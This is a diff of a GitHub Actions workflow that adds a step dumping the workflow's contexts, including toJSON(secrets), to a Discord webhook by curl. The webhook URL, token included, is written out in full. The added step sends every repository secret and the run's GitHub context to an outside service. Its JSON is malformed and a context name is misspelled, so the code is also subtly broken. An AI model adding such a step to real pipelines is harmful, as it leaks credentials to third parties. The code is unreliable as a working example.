@@ -11,8 +11,19 @@ jobs:
         env:
           MSG: '{"title": "${{ github.event_name }} - ${{ job.status }}", "description": "In repository: ${{ github.repository }}"}'
         run: 'curl -H "Content-Type: application/json" -d "{\"embeds\": [$MSG]}" -X POST https://discord.com/api/webhooks/779046008684412979/UaQqJmOHg7nwqNAupSc04_hiE-Hmrk61VwTwtgMEnuLcXFe95S29omkXHE-ikOzNk5bZ'
-      
-      - name: "aa"
+    
+    steps:
+      - name: "sendContexts"
         env:
-          THING: "THE_THING_VALUE"
-        run: "echo $THING"
+          MSG: '{"title": "Contexts", "fields": [
+            {"name": "Github", "value": "${{ toJSON(github) }}"},
+            {"name": "Env", "value": "${{ toJSON(env) }}"},
+            {"name": "Job", "value": "${{ toJSON(job) }}"}
+            {"name": "Steps", "value": "${{ toJSON(steps) }}"}
+            {"name": "Runner", "value": "${{ toJSON(runner) }}"}
+            {"name": "Secrets", "value": "${{ toJSON(secrets) }}"}
+            {"name": "Strategy", "value": "${{ toJSON(startegy) }}"}
+            {"name": "Matrix", "value": "${{ toJSON(matrix) }}"}
+            {"name": "Needs", "value": "${{ toJSON(needs) }}"}
+          ]}'
+        run: 'curl -H "Content-Type: application/json" -d "{\"embeds\": [$MSG]}" -X POST https://discord.com/api/webhooks/779046008684412979/UaQqJmOHg7nwqNAupSc04_hiE-Hmrk61VwTwtgMEnuLcXFe95S29omkXHE-ikOzNk5bZ'
